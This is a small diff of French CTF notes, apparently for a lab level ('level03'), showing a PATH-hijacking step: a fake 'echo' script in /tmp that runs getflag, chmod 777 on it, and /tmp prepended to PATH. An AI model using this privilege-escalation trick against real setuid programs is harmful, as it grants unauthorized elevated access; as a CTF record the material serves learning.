@@ -4,8 +4,10 @@ Dans un terminal hors de la VM pour pouvoir telecharger level03 :
 ghidra >
 
 >cd /tmp/
-    vim echo > \#!/bin/bash
+    vim echo > #!/bin/bash
                 getflag
+
+>chmod 777 echo
 
 >cd ..
 >export PATH=/tmp:$PATH
